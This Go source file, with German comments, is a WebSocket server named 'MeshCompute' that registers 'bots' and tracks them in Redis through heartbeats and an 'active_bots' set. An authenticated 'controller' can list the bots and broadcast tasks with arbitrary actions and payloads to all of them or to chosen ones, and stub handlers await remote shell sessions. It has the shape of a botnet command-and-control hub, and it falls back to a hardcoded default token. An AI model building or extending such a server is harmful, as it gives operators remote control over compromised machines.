package main

import (
    "context"
    "fmt"
    "log"
    "net/http"
    "os"
    "strings"
    "sync"
    "time"

    "github.com/go-redis/redis/v8"
    "nhooyr.io/websocket"
    "nhooyr.io/websocket/wsjson"
)

var (
    authToken string
    redisAddr string
    serverPort = ":8080"
)

type Client struct {
    conn *websocket.Conn
    ctx  context.Context
    id   string
    typ  string // "client" oder "controller"
    mu   sync.Mutex
}

type Hub struct {
    mu         sync.RWMutex
    clients    map[string]*Client
    register   chan *Client
    unregister chan *Client
    redis      *redis.Client
}

var (
    hub           *Hub
    shellSessions sync.Map
)

func main() {
    authToken = os.Getenv("AUTH_TOKEN")
    redisAddr = os.Getenv("REDIS_URL")
    port := os.Getenv("SERVER_PORT")

    if authToken == "" {
        authToken = "change_me_please_secure_token_123"
        log.Println("⚠️  WARNUNG: AUTH_TOKEN nicht gesetzt! Verwende unsicheren Default.")
    }
    if redisAddr == "" {
        redisAddr = "localhost:6379"
    }
    if port != "" {
        serverPort = ":" + port
    }

    hub = &Hub{
        clients:    make(map[string]*Client),
        register:   make(chan *Client),
        unregister: make(chan *Client),
        redis: redis.NewClient(&redis.Options{
            Addr:       redisAddr,
            DB:         0,
            MaxRetries: 5,
        }),
    }

    // Redis Test
    ctx := context.Background()
    if err := hub.redis.Ping(ctx).Err(); err != nil {
        log.Printf("❌ Redis nicht erreichbar: %v", err)
    } else {
        log.Println("✅ Redis verbunden")
    }

    go hub.run()
    go hub.cleanupInactiveBots() // Neuer Cleanup-Goroutine

    http.HandleFunc("/ws", handleWebSocket)

    log.Printf("🚀 MeshCompute Server läuft auf http://0.0.0.0%s", serverPort)
    log.Fatal(http.ListenAndServe(serverPort, nil))
}

func handleWebSocket(w http.ResponseWriter, r *http.Request) {
    c, err := websocket.Accept(w, r, &websocket.AcceptOptions{
        CompressionMode: websocket.CompressionDisabled,
    })
    if err != nil {
        log.Println("WebSocket Accept Fehler:", err)
        return
    }

    client := &Client{
        conn: c,
        ctx:  context.Background(),
    }
    go handleClient(client)
}

func (h *Hub) run() {
    for {
        select {
        case client := <-h.register:
            h.mu.Lock()
            h.clients[client.id] = client
            h.mu.Unlock()
            log.Printf("✅ Registriert: %s (Typ: %s)", client.id, client.typ)

        case client := <-h.unregister:
            h.mu.Lock()
            delete(h.clients, client.id)
            h.mu.Unlock()
            log.Printf("❌ Entfernt: %s", client.id)
        }
    }
}

// Periodisches Cleanup alter Bots
func (h *Hub) cleanupInactiveBots() {
    ticker := time.NewTicker(60 * time.Second)
    defer ticker.Stop()

    for range ticker.C {
        ctx := context.Background()
        now := time.Now().Unix()

        keys, err := h.redis.Keys(ctx, "bot:*").Result()
        if err != nil {
            continue
        }

        for _, key := range keys {
            tsStr, _ := h.redis.HGet(ctx, key, "heartbeat").Result()
            var ts int64
            fmt.Sscanf(tsStr, "%d", &ts)

            if now-ts > 180 { // > 3 Minuten offline
                botID := strings.TrimPrefix(key, "bot:")
                h.redis.Del(ctx, key)
                h.redis.SRem(ctx, "active_bots", botID)
                log.Printf("🧹 Inaktiver Bot entfernt: %s", botID)
            }
        }
    }
}

func handleClient(c *Client) {
    defer func() {
        c.conn.Close(websocket.StatusInternalError, "")
        if c.typ == "client" {
            hub.unregister <- c
            hub.redis.SRem(context.Background(), "active_bots", c.id)
            hub.redis.Del(context.Background(), "bot:"+c.id)
        }
    }()

    // Initiale Nachricht lesen
    var initMsg struct {
        Type      string `json:"type"`
        AuthToken string `json:"auth_token,omitempty"`
        BotID     string `json:"bot_id,omitempty"`
    }

    if err := wsjson.Read(c.ctx, c.conn, &initMsg); err != nil {
        log.Println("Init-Fehler:", err)
        return
    }

    if initMsg.Type == "controller" {
        if initMsg.AuthToken != authToken {
            log.Println("❌ Ungültiger Auth-Token für Controller")
            return
        }
        c.typ = "controller"
        c.id = fmt.Sprintf("ctrl_%d", time.Now().UnixNano())
    } else if initMsg.Type == "client" {
        if initMsg.BotID == "" {
            log.Println("❌ Client ohne BotID")
            return
        }
        c.typ = "client"
        c.id = initMsg.BotID

        ctx := context.Background()
        hub.redis.SAdd(ctx, "active_bots", c.id)
        hub.redis.HSet(ctx, "bot:"+c.id, "heartbeat", time.Now().Unix())
    } else {
        log.Println("Unbekannter Typ:", initMsg.Type)
        return
    }

    hub.register <- c

    // Heartbeat für Clients
    if c.typ == "client" {
        go heartbeatSender(c)
    }

    // Haupt-Nachrichtenschleife
    for {
        var msg map[string]interface{}
        if err := wsjson.Read(c.ctx, c.conn, &msg); err != nil {
            log.Printf("Verbindung zu %s geschlossen: %v", c.id, err)
            break
        }

        hub.handleMessage(c, msg)
    }
}

func heartbeatSender(c *Client) {
    ticker := time.NewTicker(15 * time.Second)
    defer ticker.Stop()

    ctx := context.Background()
    for range ticker.C {
        hub.redis.HSet(ctx, "bot:"+c.id, "heartbeat", time.Now().Unix())
    }
}

func (h *Hub) handleMessage(sender *Client, msg map[string]interface{}) {
    msgType, _ := msg["type"].(string)

    switch msgType {
    case "command":
        if sender.typ == "controller" {
            h.handleControllerCommand(sender, msg)
        }
    case "result":
        h.forwardToController(sender, msg)
    case "shell_input", "shell_output", "shell_exit":
        // Shell-Sessions (falls du sie später brauchst)
        h.handleShellMessage(sender, msg)
    default:
        log.Printf("Unbekannter Typ '%s' von %s", msgType, sender.id)
    }
}

func (h *Hub) handleControllerCommand(sender *Client, msg map[string]interface{}) {
    action, _ := msg["action"].(string)
    target, _ := msg["target"].(string)
    payload, _ := msg["payload"].(string)
    taskID, _ := msg["task_id"].(string)

    if action == "list" {
        h.sendBotList(sender)
        return
    }

    task := map[string]interface{}{
        "task_id": taskID,
        "action":  action,
        "target":  target,
        "payload": payload,
    }

    h.mu.RLock()
    targetFound := false
    for id, client := range h.clients {
        if client.typ == "client" && (target == "all" || id == target || strings.HasPrefix(id, target)) {
            targetFound = true
            if err := wsjson.Write(client.ctx, client.conn, task); err != nil {
                log.Printf("Fehler beim Senden an %s", id)
            }
        }
    }
    h.mu.RUnlock()

    // Bestätigung an Controller
    confirm := map[string]interface{}{
        "type":    "info",
        "message": fmt.Sprintf("Aufgabe %s an %s gesendet", action, target),
    }
    if !targetFound && target != "all" {
        confirm["message"] = fmt.Sprintf("Kein Bot gefunden mit ID/Prefix: %s", target)
    }
    wsjson.Write(sender.ctx, sender.conn, confirm)
}

func (h *Hub) sendBotList(controller *Client) {
    h.mu.RLock()
    defer h.mu.RUnlock()

    type BotInfo struct {
        BotID    string `json:"bot_id"`
        Status   string `json:"status"`
        Hostname string `json:"hostname"`
    }

    bots := []BotInfo{}
    ctx := context.Background()
    now := time.Now().Unix()

    for id, client := range h.clients {
        if client.typ != "client" {
            continue
        }

        lastSeen := 999
        tsStr, err := h.redis.HGet(ctx, "bot:"+id, "heartbeat").Result()
        if err == nil {
            var ts int64
            fmt.Sscanf(tsStr, "%d", &ts)
            lastSeen = int(now - ts)
        }

        status := "online"
        if lastSeen > 90 {
            status = "offline"
        }

        bots = append(bots, BotInfo{
            BotID:    id,
            Status:   status,
            Hostname: id,
        })
    }

    response := map[string]interface{}{
        "type": "result",
        "data": map[string]interface{}{
            "bots": bots,
        },
    }
    wsjson.Write(controller.ctx, controller.conn, response)
}

func (h *Hub) forwardToController(sender *Client, msg map[string]interface{}) {
    h.mu.RLock()
    defer h.mu.RUnlock()

    for _, client := range h.clients {
        if client.typ == "controller" {
            wsjson.Write(client.ctx, client.conn, msg)
        }
    }
}

func (h *Hub) handleShellMessage(sender *Client, msg map[string]interface{}) {
    // Shell-Funktionalität (falls du sie später aktivierst) – vorerst nur Stub
    log.Printf("Shell-Nachricht von %s: %v", sender.id, msg)
}
